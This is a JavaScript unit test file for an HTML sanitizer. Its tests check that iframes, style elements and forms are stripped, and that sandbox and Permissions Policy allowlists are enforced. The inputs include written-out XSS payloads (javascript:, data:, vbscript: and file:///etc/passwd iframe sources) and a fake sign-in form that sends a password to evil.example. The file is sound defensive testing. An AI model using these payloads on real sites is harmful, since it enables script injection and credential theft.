/* eslint-disable jsdoc/require-jsdoc */

import { describe, expect, it, vi } from 'vitest';

import { sanitizeRichTextHTML } from './sanitize.js';

describe('SANITIZE_OPTIONS style and form removal', () => {
  it('should remove style elements and forms, which would reach beyond the preview', () => {
    const sanitized = sanitizeRichTextHTML(
      '<style>body { display: none; }</style><p style="color: red">Hi</p>' +
        '<svg><style>*{}</style></svg>' +
        '<form action="https://example.com/"><input name="token"></form>',
    );

    expect(sanitized).not.toContain('<style');
    expect(sanitized).not.toContain('<form');
    expect(sanitized).not.toContain('example.com');
    // An inline style only applies to its own element, so it’s kept
    expect(sanitized).toContain('<p style="color: red">Hi</p>');
  });
});

describe('SANITIZE_OPTIONS iframe security (XSS prevention)', () => {
  it('should remove iframes with javascript: scheme', () => {
    // Testing XSS prevention - javascript: URL in test payload

    const malicious = '<iframe src="javascript:alert(1)"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
    // eslint-disable-next-line no-script-url
    expect(sanitized).not.toContain('javascript:');
  });

  it('should remove iframes with data: scheme', () => {
    const malicious = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
    expect(sanitized).not.toContain('data:');
  });

  it('should remove iframes with blob: scheme', () => {
    const malicious = '<iframe src="blob:http://example.com/uuid"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
    expect(sanitized).not.toContain('blob:');
  });

  it('should remove iframes with file: scheme', () => {
    const malicious = '<iframe src="file:///etc/passwd"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
    expect(sanitized).not.toContain('file:');
  });

  it('should remove iframes with vbscript: scheme', () => {
    const malicious = '<iframe src="vbscript:msgbox(1)"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
    expect(sanitized).not.toContain('vbscript:');
  });

  it('should remove iframes with same-origin relative paths (leading slash)', () => {
    const malicious = '<iframe src="/uploads/malicious.html"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
    expect(sanitized).not.toContain('/uploads/');
  });

  it('should remove iframes with same-origin relative paths (double slash)', () => {
    const malicious = '<iframe src="//example.com/malicious.html"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
  });

  it('should remove iframes with relative paths (dot notation)', () => {
    const malicious = '<iframe src="./malicious.html"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
  });

  it('should remove iframes with relative paths (parent directory)', () => {
    const malicious = '<iframe src="../uploads/malicious.html"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
  });

  it('should remove iframes without src attribute', () => {
    const malicious = '<iframe></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
  });

  it('should remove iframes with empty src attribute', () => {
    const malicious = '<iframe src=""></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
  });

  it('should remove iframes with whitespace-only src attribute', () => {
    const malicious = '<iframe src="   "></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
  });

  it('should block same-origin HTTPS iframes', () => {
    // Mock window.location.origin to match the iframe src origin
    vi.stubGlobal('window', {
      location: { origin: 'https://example.com' },
    });

    try {
      const sameOrigin = '<iframe src="https://example.com/malicious.html"></iframe>';
      const sanitized = sanitizeRichTextHTML(sameOrigin);

      expect(sanitized).not.toContain('iframe');
    } finally {
      // Restore original window
      vi.unstubAllGlobals();
    }
  });

  it('should remove iframes with about:blank', () => {
    const malicious = '<iframe src="about:blank"></iframe>';
    const sanitized = sanitizeRichTextHTML(malicious);

    expect(sanitized).not.toContain('iframe');
  });

  it('should enforce sandbox="allow-scripts allow-same-origin" on valid HTTPS iframes', () => {
    const embed = '<iframe src="https://www.youtube.com/embed/video123"></iframe>';
    const sanitized = sanitizeRichTextHTML(embed);

    expect(sanitized).toContain('iframe');
    expect(sanitized).toContain('allow-scripts');
    expect(sanitized).toContain('allow-same-origin');
  });

  it('should ensure both allow-scripts and allow-same-origin in sandbox', () => {
    const embed =
      '<iframe src="https://player.vimeo.com/video/123" sandbox="allow-same-origin allow-scripts"></iframe>';

    const sanitized = sanitizeRichTextHTML(embed);

    expect(sanitized).toContain('iframe');
    expect(sanitized).toContain('allow-scripts');
    expect(sanitized).toContain('allow-same-origin');
  });

  it('should add allow-scripts and allow-same-origin to custom sandbox attributes', () => {
    const embed = '<iframe src="https://example.com/embed" sandbox="allow-popups"></iframe>';
    const sanitized = sanitizeRichTextHTML(embed);

    expect(sanitized).toContain('iframe');
    expect(sanitized).toContain('allow-scripts');
    expect(sanitized).toContain('allow-same-origin');
    expect(sanitized).toContain('allow-popups');
  });

  it('should preserve allow and allowfullscreen attributes', () => {
    const embed =
      '<iframe src="https://www.youtube.com/embed/video" allow="autoplay; encrypted-media" allowfullscreen></iframe>';

    const sanitized = sanitizeRichTextHTML(embed);

    expect(sanitized).toContain('iframe');
    expect(sanitized).toContain('allow="autoplay; encrypted-media"');
    expect(sanitized).toContain('allowfullscreen');
    expect(sanitized).toContain('allow-scripts');
    expect(sanitized).toContain('allow-same-origin');
  });

  it('should preserve referrerpolicy attribute', () => {
    const embed =
      '<iframe src="https://www.youtube.com/embed/video" referrerpolicy="strict-origin-when-cross-origin"></iframe>';

    const sanitized = sanitizeRichTextHTML(embed);

    expect(sanitized).toContain('iframe');
    expect(sanitized).toContain('referrerpolicy="strict-origin-when-cross-origin"');
    expect(sanitized).toContain('allow-scripts');
    expect(sanitized).toContain('allow-same-origin');
  });

  it('should allow HTTPS iframes from trusted external providers', () => {
    const youtubeEmbed = '<iframe src="https://www.youtube.com/embed/abc"></iframe>';
    const vimeoEmbed = '<iframe src="https://player.vimeo.com/video/123"></iframe>';
    const externalEmbed = '<iframe src="https://example.com/embed/content"></iframe>';

    expect(sanitizeRichTextHTML(youtubeEmbed)).toContain('iframe');
    expect(sanitizeRichTextHTML(vimeoEmbed)).toContain('iframe');
    expect(sanitizeRichTextHTML(externalEmbed)).toContain('iframe');
  });

  it('should block HTTP iframes', () => {
    const httpEmbed = '<iframe src="http://example.com/embed"></iframe>';
    const sanitized = sanitizeRichTextHTML(httpEmbed);

    expect(sanitized).not.toContain('iframe');
  });

  it('should block multiple XSS vectors in a single document', () => {
    const multipleThreats = `
      <iframe src="javascript:alert('xss1')"></iframe>
      <iframe src="/uploads/malicious.html"></iframe>
      <iframe src="data:text/html,<script>alert('xss2')</script>"></iframe>
      <iframe src="blob:http://evil.com/uuid"></iframe>
      <iframe src="https://www.youtube.com/embed/safe"></iframe>
    `;

    const sanitized = sanitizeRichTextHTML(multipleThreats);
    // Should only contain the safe HTTPS iframe
    const iframeMatches = sanitized.match(/<iframe/g);

    expect(iframeMatches).toHaveLength(1);
    expect(sanitized).toContain('https://www.youtube.com/embed/safe');
    // eslint-disable-next-line no-script-url
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).not.toContain('/uploads/');
    expect(sanitized).not.toContain('data:');
    expect(sanitized).not.toContain('blob:');
  });

  it('should handle case-insensitive scheme matching', () => {
    // Testing XSS prevention with various capitalizations

    const schemes = [
      '<iframe src="JavaScript:alert(1)"></iframe>',
      '<iframe src="JAVASCRIPT:alert(1)"></iframe>',
      '<iframe src="JaVaScRiPt:alert(1)"></iframe>',
      '<iframe src="DATA:text/html,xss"></iframe>',
      '<iframe src="BloB:http://evil.com/x"></iframe>',
    ];

    schemes.forEach((html) => {
      const sanitized = sanitizeRichTextHTML(html);

      expect(sanitized).not.toContain('iframe');
    });
  });

  it('should block iframes with obfuscated same-origin paths', () => {
    const obfuscated = [
      '<iframe src="  /uploads/file.html"></iframe>',
      '<iframe src="\\uploads\\file.html"></iframe>',
      '<iframe src="//localhost/file.html"></iframe>',
    ];

    obfuscated.forEach((html) => {
      const sanitized = sanitizeRichTextHTML(html);

      expect(sanitized).not.toContain('iframe');
    });
  });

  it('should handle iframes with invalid URLs', () => {
    const invalid = [
      '<iframe src="not a url at all"></iframe>',
      '<iframe src="ht!tp://broken.com"></iframe>',
      '<iframe src="://no-protocol.com"></iframe>',
    ];

    invalid.forEach((html) => {
      const sanitized = sanitizeRichTextHTML(html);

      expect(sanitized).not.toContain('iframe');
    });
  });

  it('should block malformed HTTPS URLs that throw in URL constructor', () => {
    const malformed = [
      '<iframe src="https://"></iframe>', // Missing host
      '<iframe src="https:// bad spaces"></iframe>', // Spaces in URL
      '<iframe src="https://[invalid:ipv6"></iframe>', // Malformed IPv6
    ];

    malformed.forEach((html) => {
      const sanitized = sanitizeRichTextHTML(html);

      expect(sanitized).not.toContain('iframe');
    });
  });

  it('should normalize sandbox attributes when multiple are present', () => {
    const bypassAttempt =
      '<iframe src="https://example.com" sandbox="allow-scripts allow-same-origin" sandbox=""></iframe>';

    const sanitized = sanitizeRichTextHTML(bypassAttempt);

    expect(sanitized).toContain('allow-scripts');
    expect(sanitized).toContain('allow-same-origin');
  });

  /**
   * Sanitize the given iframe HTML and return an accessor for the resulting iframe’s attributes.
   * The unit tests run without a DOM, so the attributes are read from the serialized HTML.
   * @param {string} html Iframe HTML.
   * @returns {{ getAttribute: (name: string) => string | null, hasAttribute: (name: string) =>
   * boolean } | null} Attribute accessor, or `null` if the iframe was removed.
   */
  const sanitizeIframe = (html) => {
    const tag = sanitizeRichTextHTML(html).match(/<iframe\b[^>]*>/)?.[0];

    if (!tag) {
      return null;
    }

    const getAttribute = (/** @type {string} */ name) => {
      const match = tag.match(new RegExp(`\\s${name}(?:="([^"]*)")?(?=[\\s>])`));

      return match ? (match[1] ?? '').replaceAll('&amp;', '&') : null;
    };

    return { getAttribute, hasAttribute: (name) => getAttribute(name) !== null };
  };

  it('should drop sandbox tokens that are not on the allowlist', () => {
    const iframe = sanitizeIframe(
      '<iframe src="https://attacker.example/phish.html" sandbox="allow-top-navigation ' +
        'allow-top-navigation-by-user-activation allow-top-navigation-to-custom-protocols ' +
        'allow-popups allow-popups-to-escape-sandbox allow-modals allow-downloads allow-forms ' +
        'allow-unknown-future-token"></iframe>',
    );

    expect(iframe?.getAttribute('sandbox')).toBe(
      'allow-popups allow-forms allow-scripts allow-same-origin',
    );
  });

  it('should keep all the allowed sandbox tokens', () => {
    const tokens =
      'allow-forms allow-orientation-lock allow-pointer-lock allow-popups allow-presentation ' +
      'allow-same-origin allow-scripts allow-storage-access-by-user-activation';

    const iframe = sanitizeIframe(
      `<iframe src="https://example.com" sandbox="${tokens}"></iframe>`,
    );

    expect(iframe?.getAttribute('sandbox')).toBe(tokens);
  });

  it('should compare sandbox tokens case-insensitively', () => {
    const iframe = sanitizeIframe(
      '<iframe src="https://example.com" sandbox="ALLOW-TOP-NAVIGATION Allow-Popups"></iframe>',
    );

    expect(iframe?.getAttribute('sandbox')).toBe('allow-popups allow-scripts allow-same-origin');
  });

  it('should drop Permissions Policy features that are not on the allowlist', () => {
    const iframe = sanitizeIframe(
      '<iframe src="https://example.com" allow="camera; autoplay; geolocation; ' +
        'clipboard-read; Encrypted-Media; microphone; display-capture"></iframe>',
    );

    expect(iframe?.getAttribute('allow')).toBe('autoplay; Encrypted-Media');
  });

  it('should keep the allowed Permissions Policy features of common embed codes', () => {
    const allow =
      'accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; ' +
      'picture-in-picture; web-share';

    const iframe = sanitizeIframe(
      `<iframe src="https://www.youtube.com/embed/abc" allow="${allow}" allowfullscreen></iframe>`,
    );

    expect(iframe?.getAttribute('allow')).toBe(allow);
    expect(iframe?.hasAttribute('allowfullscreen')).toBe(true);
  });

  it('should keep the origin allowlist of a Permissions Policy directive', () => {
    const iframe = sanitizeIframe(
      '<iframe src="https://example.com" allow="fullscreen \'self\' https://example.com; camera \'src\';"></iframe>',
    );

    expect(iframe?.getAttribute('allow')).toBe("fullscreen 'self' https://example.com");
  });

  it('should remove the allow attribute when no feature is allowed', () => {
    const iframe = sanitizeIframe(
      '<iframe src="https://example.com" allow="camera; microphone"></iframe>',
    );

    expect(iframe).not.toBeNull();
    expect(iframe?.hasAttribute('allow')).toBe(false);
  });

  it('should not add an allow attribute when there is none', () => {
    const iframe = sanitizeIframe('<iframe src="https://example.com"></iframe>');

    expect(iframe?.hasAttribute('allow')).toBe(false);
  });
});

describe('SANITIZE_OPTIONS UI redress prevention', () => {
  it.each(['style', 'form', 'input', 'button', 'textarea', 'select', 'option'])(
    'should remove the `%s` element',
    (tag) => {
      const sanitized = sanitizeRichTextHTML(`<p>Hello <${tag}>x</${tag}></p>`);

      expect(sanitized).not.toContain(`<${tag}`);
    },
  );

  it('should remove a stylesheet that would restyle the whole app', () => {
    const sanitized = sanitizeRichTextHTML('<p>Hello <style>body { display: none }</style></p>');

    expect(sanitized).toBe('<p>Hello </p>');
  });

  it('should remove a phishing form overlaid on the app', () => {
    const sanitized = sanitizeRichTextHTML(
      '<div style="position: fixed; inset: 0; z-index: 9999">' +
        '<form action="https://evil.example/x"><input type="password" name="t">' +
        '<button>Sign in</button></form></div>',
    );

    expect(sanitized).not.toMatch(/form|input|button|position|inset|z-index|evil/);
  });

  it('should drop positioning and other disallowed CSS from inline styles', () => {
    const sanitized = sanitizeRichTextHTML(
      '<div style="position: absolute; top: 0; left: 0; transform: translate(-100px); ' +
        'background: url(https://evil.example/a.png) red; color: blue">x</div>',
    );

    expect(sanitized).not.toMatch(/position|top|left|transform|url|evil|background-image/);
    expect(sanitized).toMatch(/style="[^"]*color: blue/);
    expect(sanitized).toMatch(/style="[^"]*background-color: red/);
  });

  it('should remove the style attribute when no property is allowed', () => {
    expect(sanitizeRichTextHTML('<p style="position: fixed">x</p>')).toBe('<p>x</p>');
    expect(sanitizeRichTextHTML('<p style="">x</p>')).toBe('<p>x</p>');
  });

  it('should keep the inline styles of syntax highlighting', () => {
    const shiki =
      '<pre class="shiki github-light" style="background-color:#fff;color:#24292e" tabindex="0">' +
      '<code><span class="line"><span style="color:#D73A49;font-style:italic;font-weight:bold;' +
      'text-decoration:underline">const</span></span></code></pre>';

    const sanitized = sanitizeRichTextHTML(shiki);

    expect(sanitized).toContain('style="background-color:#fff;color:#24292e"');
    expect(sanitized).toContain('font-style:italic;font-weight:bold;text-decoration:underline');
  });

  it('should keep inline sizing and alignment used in content', () => {
    const html =
      '<p style="text-align: center"><img src="a.png" style="width: 50%; max-width: 300px"></p>';

    expect(sanitizeRichTextHTML(html)).toBe(html);
  });

  it('should keep the !important priority of an allowed property', () => {
    expect(sanitizeRichTextHTML('<p style="position: fixed; color: red !important">x</p>')).toMatch(
      /<p style="color: red !important;?">x<\/p>/,
    );
  });
});
